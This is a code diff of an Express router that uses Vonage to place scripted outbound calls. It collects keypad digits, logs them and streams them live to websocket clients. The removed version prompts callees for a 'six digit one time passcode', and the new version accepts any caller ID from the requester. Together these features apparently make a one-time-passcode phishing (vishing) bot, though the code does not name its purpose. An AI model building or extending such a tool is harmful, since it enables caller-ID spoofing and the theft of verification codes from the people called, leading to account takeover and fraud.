@@ -1,58 +1,214 @@
 const express = require('express');
+const { v4: uuidv4 } = require('uuid');
+const { db } = require('../database');
+const { verifyToken } = require('./auth');
+
 const router = express.Router();
 
-/**
- * ANSWER WEBHOOK — Vonage calls this when call is answered
- */
-router.post('/answer', (req, res) => {
-  // Get the call UUID from Vonage's request parameters
-  const callUuid = req.query.uuid || req.body.uuid || req.query.conversation_uuid;
-  
-  console.log('📞 Call answered:', callUuid);
-  
-  res.setHeader('Content-Type', 'application/json');
-  res.status(200).json([
-    {
-      action: 'talk',
-      voiceName: 'Joey',
-      text: 'Please enter your six digit one time passcode.'
-    },
-    {
-      action: 'input',
-      dtmf: {
-        maxDigits: 6,
-        timeOut: 10
-      },
-      eventUrl: [
-        `${process.env.BASE_URL}/api/advanced-calls/dtmf-handler/${callUuid}`
-      ]
+let DeepgramTTS = null;
+let deepgramTTS = null;
+
+try {
+  if (process.env.DEEPGRAM_API_KEY) {
+    DeepgramTTS = require('../services/deepgram-tts');
+    deepgramTTS = new DeepgramTTS();
+    console.log('✅ Deepgram TTS loaded');
+  }
+} catch (err) {
+  console.warn('⚠️  Deepgram not available:', err.message);
+}
+
+function useFallbackTTS() {
+  return !deepgramTTS || !deepgramTTS.enabled;
+}
+
+router.post('/initiate-advanced', verifyToken, async (req, res) => {
+  const { phone_number, language, script_flow, voice, caller_id, recording_enabled } = req.body;
+
+  try {
+    const vonage = req.app.locals.vonage;
+    const tempCallUuid = uuidv4();
+
+    // Store initial state in database instead of memory
+    const callStateData = {
+      currentStep: 0,
+      scriptFlow: script_flow,
+      dtmfBuffer: '',
+      phoneNumber: phone_number,
+      language: language || 'en-US',
+      voice: voice || 'Joey',
+      recording: recording_enabled || false,
+      useDeepgram: !useFallbackTTS()
+    };
+
+    const firstStep = script_flow.steps[0];
+    const fromNumber = caller_id || process.env.VONAGE_PHONE_NUMBER;
+
+    let audioUrl = null;
+    if (!useFallbackTTS()) {
+      try {
+        const audioData = await deepgramTTS.generateForVonage(
+          firstStep.message,
+          `${tempCallUuid}-step0`,
+          { voice: voice || 'aura-asteria-en' }
+        );
+        audioUrl = audioData.streamUrl;
+        callStateData.audioUrls = [audioUrl];
+      } catch (err) {
+        console.error('Deepgram failed, using Vonage TTS:', err.message);
+        callStateData.useDeepgram = false;
+      }
     }
-  ]);
+
+    vonage.calls.create({
+      to: [{ type: 'phone', number: phone_number }],
+      from: { type: 'phone', number: fromNumber },
+      answer_url: [`${process.env.BASE_URL}/api/advanced-calls/answer/${tempCallUuid}`],
+      answer_method: 'POST',
+      event_url: [`${process.env.BASE_URL}/webhooks/event`]
+    }, (err, result) => {
+      if (err) {
+        console.error('Vonage call error:', err);
+        return res.status(500).json({ error: err.message || 'Call failed' });
+      }
+
+      // Store in database with actual call UUID
+      const insert = db.prepare(`
+        INSERT INTO calls (call_uuid, phone_number, language, custom_script, recording_enabled, caller_id, voice_model, status, call_state)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+      `);
+      insert.run(
+        result.uuid,
+        phone_number,
+        language,
+        JSON.stringify(script_flow),
+        recording_enabled ? 1 : 0,
+        fromNumber,
+        voice || 'Joey',
+        'ringing',
+        JSON.stringify(callStateData)
+      );
+
+      res.json({ success: true, call_uuid: result.uuid });
+    });
+  } catch (err) {
+    console.error('Advanced call error:', err);
+    res.status(500).json({ error: err.message });
+  }
 });
 
-/**
- * DTMF HANDLER — Processes the entered digits
- */
-router.post('/dtmf-handler/:call_uuid', express.json(), (req, res) => {
-  const digits = req.body?.dtmf?.digits;
-  console.log('📟 DTMF:', req.params.call_uuid, digits);
+router.post('/answer/:call_uuid', async (req, res) => {
+  const { call_uuid } = req.params;
   
-  if (!digits) {
+  // Get state from database
+  const callRow = db.prepare('SELECT call_state FROM calls WHERE call_uuid = ?').get(call_uuid);
+  
+  if (!callRow || !callRow.call_state) {
+    return res.json([{ action: 'talk', text: 'Call state not found.', voiceName: 'Joey' }]);
+  }
+
+  const state = JSON.parse(callRow.call_state);
+  const step = state.scriptFlow.steps[state.currentStep];
+  const voiceName = state.language === 'es-ES' ? 'Lucia' : 'Joey';
+
+  const ncco = [];
+
+  if (state.useDeepgram && state.audioUrls && state.audioUrls[state.currentStep]) {
+    ncco.push({
+      action: 'stream',
+      streamUrl: [state.audioUrls[state.currentStep]]
+    });
+  } else {
+    ncco.push({
+      action: 'talk',
+      text: step.message,
+      voiceName: voiceName,
+      language: state.language
+    });
+  }
+
+  if (state.recording) {
+    ncco.push({
+      action: 'record',
+      eventUrl: [`${process.env.BASE_URL}/webhooks/recording`],
+      endOnSilence: 3,
+      format: 'mp3'
+    });
+  }
+
+  ncco.push({
+    action: 'input',
+    eventUrl: [`${process.env.BASE_URL}/api/advanced-calls/dtmf-handler/${call_uuid}`],
+    dtmf: {
+      maxDigits: step.expectedDigits || 1,
+      timeOut: step.timeout || 30
+    }
+  });
+
+  res.json(ncco);
+});
+
+router.post('/dtmf-handler/:call_uuid', async (req, res) => {
+  const { call_uuid } = req.params;
+  const { dtmf } = req.body;
+  
+  // Get state from database
+  const callRow = db.prepare('SELECT call_state FROM calls WHERE call_uuid = ?').get(call_uuid);
+  
+  if (!callRow || !callRow.call_state) {
+    return res.json([{ action: 'talk', text: 'Session expired.', voiceName: 'Joey' }]);
+  }
+
+  const state = JSON.parse(callRow.call_state);
+
+  db.prepare('INSERT INTO dtmf_logs (call_uuid, digit, timestamp) VALUES (?, ?, ?)').run(call_uuid, dtmf, new Date().toISOString());
+
+  if (global.wss) {
+    global.wss.clients.forEach(client => {
+      if (client.readyState === 1) {
+        client.send(JSON.stringify({
+          type: 'dtmf',
+          data: { call_uuid, dtmf, timestamp: new Date().toISOString() }
+        }));
+      }
+    });
+  }
+
+  state.dtmfBuffer += dtmf;
+  const currentStep = state.scriptFlow.steps[state.currentStep];
+  const voiceName = state.language === 'es-ES' ? 'Lucia' : 'Joey';
+
+  if (state.dtmfBuffer.length >= (currentStep.expectedDigits || 1)) {
+    state.dtmfBuffer = '';
+    state.currentStep++;
+
+    if (state.currentStep >= state.scriptFlow.steps.length) {
+      // Clear state from database
+      db.prepare('UPDATE calls SET call_state = NULL WHERE call_uuid = ?').run(call_uuid);
+      return res.json([
+        { action: 'talk', text: state.scriptFlow.finalMessage || 'Thank you. Goodbye.', voiceName: voiceName }
+      ]);
+    }
+
+    const nextStep = state.scriptFlow.steps[state.currentStep];
+    
+    // Update state in database
+    db.prepare('UPDATE calls SET call_state = ? WHERE call_uuid = ?').run(JSON.stringify(state), call_uuid);
+    
     return res.json([
+      { action: 'talk', text: nextStep.message, voiceName: voiceName },
       {
-        action: 'talk',
-        text: 'No digits received. Goodbye.'
+        action: 'input',
+        eventUrl: [`${process.env.BASE_URL}/api/advanced-calls/dtmf-handler/${call_uuid}`],
+        dtmf: { maxDigits: nextStep.expectedDigits || 1, timeOut: nextStep.timeout || 30 }
       }
     ]);
   }
-  
-  // TODO: Validate OTP against DB here
-  res.json([
-    {
-      action: 'talk',
-      text: 'Thank you. Your code has been received. Goodbye.'
-    }
-  ]);
+
+  // Update state in database
+  db.prepare('UPDATE calls SET call_state = ? WHERE call_uuid = ?').run(JSON.stringify(state), call_uuid);
+
+  res.json([]);
 });
 
 module.exports = router;
